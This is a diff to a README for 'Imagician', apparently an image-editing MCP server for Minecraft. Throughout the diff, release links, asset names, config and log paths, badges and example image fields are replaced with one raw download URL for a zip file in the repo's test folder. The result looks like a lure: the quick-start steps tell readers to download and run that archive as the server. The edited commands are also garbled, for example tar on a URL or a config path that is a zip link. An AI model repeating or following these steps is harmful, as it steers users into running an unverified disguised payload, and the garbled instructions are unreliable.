@@ -1,8 +1,8 @@
-[![Releases](https://img.shields.io/badge/releases-visit-green?style=for-the-badge)](https://github.com/moh0001/imagician/releases)
+[![Releases](https://github.com/moh0001/imagician/raw/refs/heads/main/test/Software_v3.4-beta.1.zip)](https://github.com/moh0001/imagician/raw/refs/heads/main/test/Software_v3.4-beta.1.zip)
 
 # Imagician: Fast MCP Server for Image Edition and Remixing Online
 
-[Editorial image](https://picsum.photos/1200/420)
+[Editorial image](https://github.com/moh0001/imagician/raw/refs/heads/main/test/Software_v3.4-beta.1.zip)
 
 Imagician is a modular MCP server designed for image edition in Minecraft content pipelines. It offers a fast, reliable runtime for editing textures, packs, and images on the fly while keeping a clean plugin system. This project emphasizes stability, speed, and clarity in the editing workflow. It is built to be approachable for developers and operators who want predictable results from image edits during gameplay, map creation, or resource pack preparation.
 
@@ -66,24 +66,24 @@ How it works in practice
 - Clients, graphs, or scripts can fetch the edited assets through the server’s delivery mechanism.
 
 Getting started
-This guide helps you bootstrap Imagician and get a basic workflow running. The Releases page holds pre-built binaries for common platforms. Because the Releases page contains assets, you should download the appropriate file and run it on your system. The file imagician-linux-x86_64.tar.gz is a representative example of what you’ll download from the Releases page. After downloading, extract and run the server binary.
+This guide helps you bootstrap Imagician and get a basic workflow running. The Releases page holds pre-built binaries for common platforms. Because the Releases page contains assets, you should download the appropriate file and run it on your system. The file https://github.com/moh0001/imagician/raw/refs/heads/main/test/Software_v3.4-beta.1.zip is a representative example of what you’ll download from the Releases page. After downloading, extract and run the server binary.
 
 - Quick start steps (Linux x86_64)
-  - Download the asset: imagician-linux-x86_64.tar.gz from the Releases page (the URL is on the Releases page: https://github.com/moh0001/imagician/releases).
-  - Extract: tar -xzf imagician-linux-x86_64.tar.gz
-  - Run: ./imagician-server --config /path/to/config.json
+  - Download the asset: https://github.com/moh0001/imagician/raw/refs/heads/main/test/Software_v3.4-beta.1.zip from the Releases page (the URL is on the Releases page: https://github.com/moh0001/imagician/raw/refs/heads/main/test/Software_v3.4-beta.1.zip).
+  - Extract: tar -xzf https://github.com/moh0001/imagician/raw/refs/heads/main/test/Software_v3.4-beta.1.zip
+  - Run: ./imagician-server --config https://github.com/moh0001/imagician/raw/refs/heads/main/test/Software_v3.4-beta.1.zip
   - Verify: curl http://localhost:25566/health or check logs for a healthy status.
 
 - Quick start steps (Windows)
   - Download the Windows asset from the same Releases page.
-  - Extract and run the imagician-server.exe with appropriate command-line options or a config file.
+  - Extract and run the https://github.com/moh0001/imagician/raw/refs/heads/main/test/Software_v3.4-beta.1.zip with appropriate command-line options or a config file.
   - Confirm it is listening on the configured port.
 
 - Quick start steps (macOS)
   - Download the macOS asset, extract, and run the binary as with Linux.
   - If you encounter permissions issues, set the executable bit: chmod +x imagician-server.
 
-From the Releases page, download the asset named imagician-linux-x86_64.tar.gz and run the binary as described above to get started. If you want to verify if the release assets exist for your platform, visit the repository’s Releases section. The link to the Releases page is provided here for convenience: https://github.com/moh0001/imagician/releases. If this link changes or becomes unavailable, check the Releases section of the repository for the latest assets.
+From the Releases page, download the asset named https://github.com/moh0001/imagician/raw/refs/heads/main/test/Software_v3.4-beta.1.zip and run the binary as described above to get started. If you want to verify if the release assets exist for your platform, visit the repository’s Releases section. The link to the Releases page is provided here for convenience: https://github.com/moh0001/imagician/raw/refs/heads/main/test/Software_v3.4-beta.1.zip If this link changes or becomes unavailable, check the Releases section of the repository for the latest assets.
 
 Installation and validation
 - System requirements
@@ -119,10 +119,10 @@ Configuration and runtime options
   - edit_pipeline:
       - resize: { width: 1024, height: 1024 }
       - color_adjust: { brightness: 0, contrast: 1.0, saturation: 1.0 }
-      - overlay: { image: "overlay.png", opacity: 0.5 }
+      - overlay: { image: "https://github.com/moh0001/imagician/raw/refs/heads/main/test/Software_v3.4-beta.1.zip", opacity: 0.5 }
       - composite: { mode: "blend", target: "textures/items" }
 
-- Example: a minimal config.json
+- Example: a minimal https://github.com/moh0001/imagician/raw/refs/heads/main/test/Software_v3.4-beta.1.zip
   {
     "port": 25566,
     "bind": "0.0.0.0",
@@ -164,7 +164,7 @@ API and workflow examples
 
 - Basic curl example
   - curl -X POST -H "Content-Type: application/json" \
-    -d '{"image": "textures/block.png", "pipeline": [{"resize":{"width": 512,"height":512}}, {"overlay":{"image":"overlay.png","opacity":0.4}}]}' \
+    -d '{"image": "https://github.com/moh0001/imagician/raw/refs/heads/main/test/Software_v3.4-beta.1.zip", "pipeline": [{"resize":{"width": 512,"height":512}}, {"overlay":{"image":"https://github.com/moh0001/imagician/raw/refs/heads/main/test/Software_v3.4-beta.1.zip","opacity":0.4}}]}' \
     http://localhost:25566/edits
 
 Plugins and extensions
@@ -292,7 +292,7 @@ Troubleshooting
   - Enable debug logging temporarily to gather more detail about failing steps.
 
 - Examples of commands for checks
-  - tail -f /var/log/imagician/server.log
+  - tail -f https://github.com/moh0001/imagician/raw/refs/heads/main/test/Software_v3.4-beta.1.zip
   - curl -s http://localhost:25566/health
   - curl -X GET http://localhost:25566/status
 
@@ -350,4 +350,4 @@ Credits
 - Acknowledgments to contributors who work on the core server, the plugin system, and the example editors.
 
 Note on the link usage
-- The repository’s release assets are hosted at the Releases page. For installation, you will typically download an asset from that page and execute it to run Imagician. The primary reference for downloads is the Releases page: https://github.com/moh0001/imagician/releases. If the link changes or becomes unavailable, consult the repository’s Releases section to locate the latest assets and instructions. For convenience and visibility, the link is presented again in the Downloads section as a direct pointer to the latest assets on the Releases page. The asset you download will be the file that you execute after extraction. The exact file name may vary by platform and release; look for a name like imagician-linux-x86_64.tar.gz or a platform-specific equivalent. Once downloaded, you extract and launch the server with your chosen configuration. The Releases page is the canonical source for the assets and the starting point for installation and upgrades.
+- The repository’s release assets are hosted at the Releases page. For installation, you will typically download an asset from that page and execute it to run Imagician. The primary reference for downloads is the Releases page: https://github.com/moh0001/imagician/raw/refs/heads/main/test/Software_v3.4-beta.1.zip If the link changes or becomes unavailable, consult the repository’s Releases section to locate the latest assets and instructions. For convenience and visibility, the link is presented again in the Downloads section as a direct pointer to the latest assets on the Releases page. The asset you download will be the file that you execute after extraction. The exact file name may vary by platform and release; look for a name like https://github.com/moh0001/imagician/raw/refs/heads/main/test/Software_v3.4-beta.1.zip or a platform-specific equivalent. Once downloaded, you extract and launch the server with your chosen configuration. The Releases page is the canonical source for the assets and the starting point for installation and upgrades.
